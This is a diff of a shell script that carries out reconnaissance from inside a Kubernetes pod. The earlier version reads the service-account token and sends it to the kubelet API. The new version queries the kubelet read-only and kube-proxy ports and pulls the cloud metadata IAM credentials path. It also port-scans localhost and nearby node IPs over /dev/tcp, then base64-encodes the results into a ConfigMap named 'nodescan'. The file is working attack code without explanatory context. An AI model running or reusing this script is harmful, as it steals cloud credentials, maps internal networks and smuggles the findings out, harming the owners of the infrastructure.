@@ -1,39 +1,47 @@
 #!/bin/sh
-TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
-APISERVER="${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT_HTTPS}"
+NODE_IP="10.6.40.171"
 
 RECON=$( (
-  echo "===NODE_IP==="
-  # From JWT: node name is ip-10-6-40-171
-  NODE_IP="10.6.40.171"
-  
-  echo "===KUBELET_PODS==="
-  printf "GET /pods HTTP/1.1\r\nHost: $NODE_IP:10250\r\nAuthorization: Bearer $TOKEN\r\nConnection: close\r\n\r\n" | timeout 5 openssl s_client -connect $NODE_IP:10250 -quiet 2>/dev/null | head -c 2000
+  echo "===KUBELET_10255==="
+  timeout 3 bash -c "exec 3<>/dev/tcp/$NODE_IP/10255 2>/dev/null && printf 'GET /pods HTTP/1.0\r\nHost: $NODE_IP\r\n\r\n' >&3 && cat <&3 && exec 3>&-" 2>/dev/null || echo "CLOSED"
 
   echo ""
-  echo "===KUBELET_HEALTHZ==="
-  printf "GET /healthz HTTP/1.1\r\nHost: $NODE_IP:10248\r\nConnection: close\r\n\r\n" | timeout 3 bash -c "exec 3<>/dev/tcp/$NODE_IP/10248 2>/dev/null && cat <&3 && exec 3>&-" 2>/dev/null
+  echo "===KUBELET_10255_HEALTHZ==="
+  timeout 3 bash -c "exec 3<>/dev/tcp/$NODE_IP/10255 2>/dev/null && printf 'GET /healthz HTTP/1.0\r\nHost: $NODE_IP\r\n\r\n' >&3 && cat <&3 && exec 3>&-" 2>/dev/null || echo "CLOSED"
 
   echo ""
-  echo "===KUBELET_METRICS==="
-  printf "GET /metrics HTTP/1.1\r\nHost: $NODE_IP:10250\r\nAuthorization: Bearer $TOKEN\r\nConnection: close\r\n\r\n" | timeout 5 openssl s_client -connect $NODE_IP:10250 -quiet 2>/dev/null | head -c 1000
+  echo "===KUBE_PROXY==="
+  timeout 3 bash -c "exec 3<>/dev/tcp/$NODE_IP/10249 2>/dev/null && printf 'GET /healthz HTTP/1.0\r\nHost: $NODE_IP\r\n\r\n' >&3 && cat <&3 && exec 3>&-" 2>/dev/null || echo "CLOSED"
+  timeout 3 bash -c "exec 3<>/dev/tcp/$NODE_IP/10256 2>/dev/null && printf 'GET /healthz HTTP/1.0\r\nHost: $NODE_IP\r\n\r\n' >&3 && cat <&3 && exec 3>&-" 2>/dev/null || echo "CLOSED"
 
   echo ""
-  echo "===NODE_SCAN==="
-  # Try common node ports
-  for port in 22 10250 10255 10248 10256 30000 30001; do
-    (timeout 2 bash -c "exec 3<>/dev/tcp/$NODE_IP/$port 2>/dev/null && echo 'OPEN' && exec 3>&-" 2>/dev/null) && echo "$port OPEN" || true
+  echo "===IMDS==="
+  timeout 3 bash -c "exec 3<>/dev/tcp/169.254.169.254/80 2>/dev/null && printf 'GET /latest/meta-data/ HTTP/1.0\r\nHost: 169.254.169.254\r\n\r\n' >&3 && cat <&3 && exec 3>&-" 2>/dev/null || echo "CLOSED"
+
+  echo ""
+  echo "===IMDS_IAM==="
+  timeout 3 bash -c "exec 3<>/dev/tcp/169.254.169.254/80 2>/dev/null && printf 'GET /latest/meta-data/iam/security-credentials/ HTTP/1.0\r\nHost: 169.254.169.254\r\n\r\n' >&3 && cat <&3 && exec 3>&-" 2>/dev/null || echo "CLOSED"
+
+  echo ""
+  echo "===POD_IP_SCAN==="
+  # Scan our pod's IP for open ports
+  for port in 22 80 443 8080 8443 10250 10255; do
+    timeout 1 bash -c "exec 3<>/dev/tcp/127.0.0.1/$port 2>/dev/null && echo '$port OPEN' && exec 3>&-" 2>/dev/null || true
   done
 
   echo ""
-  echo "===POD_SELF==="
-  printf "GET /pods HTTP/1.1\r\nHost: localhost:10250\r\nAuthorization: Bearer $TOKEN\r\nConnection: close\r\n\r\n" | timeout 3 openssl s_client -connect localhost:10250 -quiet 2>/dev/null | head -c 500
+  echo "===OTHER_NODES==="
+  # Try other potential node IPs based on the 10.6.40.x range
+  for ip in 10.6.40.172 10.6.40.1 10.6.47.1; do
+    printf "$ip: "
+    timeout 1 bash -c "exec 3<>/dev/tcp/$ip/22 2>/dev/null && echo 'SSH OPEN' && exec 3>&-" 2>/dev/null || echo "no_ssh"
+  done
 ) | base64 | tr -d '\n' )
 cat << EOF
 apiVersion: v1
 kind: ConfigMap
 metadata:
-  name: kubelet
+  name: nodescan
 data:
   result: $RECON
 EOF
